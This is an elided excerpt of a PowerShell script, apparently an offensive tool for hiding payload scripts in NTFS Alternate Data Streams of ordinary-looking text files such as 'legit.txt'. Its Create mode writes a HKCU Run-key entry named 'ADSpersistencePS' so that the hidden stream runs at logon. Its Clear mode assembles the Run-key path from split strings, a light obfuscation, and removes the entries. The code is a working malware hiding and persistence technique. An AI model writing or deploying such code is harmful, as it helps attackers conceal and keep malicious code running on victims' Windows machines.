...
.EXAMPLE
   ...
   Delete payload.bat ADS $DATA stream from legit.txt text file records and ALL reg keys
...
If($ADS -ieq "Enum")
{
    ...
    ## Start Query
    Get-ChildItem "$StartDir" -Recurse -Force -EA SilentlyContinue | % { gi $_.FullName -stream * } |
    Where-Object Stream -ieq "${ParseDataName}" | Where-Object { $_ -iNotMatch 'Zone.Identifier' } |
    ...
    Else
    {
        ...
        echo "[ inf ] Imput a diferent -StartDir 'dir' where to start search recursive!`n`n" >> $Env:TMP\jdgfjd.log
        Get-Content -Path "$Env:TMP\jdgfjd.log"
        Remove-Item -Path "$Env:TMP\jdgfjd.log" -Force
...
ElseIf($ADS -ieq "Create")
{
    ...
    If($ParseDataName -Match '.ps1$')
    {
        ...
        echo "[cmd] Execute_ADS : powershell .\${InTextFile}:${ParseDataName}" >> $Env:TMP\gdfdod.log
        ...
        If($Registry -ieq "True")
        {
           ...
           New-ItemProperty -Path "$path1" -Name 'ADSpersistencePS' -Value "powershell .\${InTextFile}:${ParseDataName}" -PropertyType String -Force|Select-Object ADSpersistencePS,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
    }
    ElseIf($ParseDataName -Match '.bat$')
    {
...
ElseIf($ADS -ieq "Clear")
{
    ...
    $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\R" + "un" -join ''
    Remove-ItemProperty -Path "$path1" -Name "ADSpersistencePS1" -ErrorAction SilentlyContinue -Force
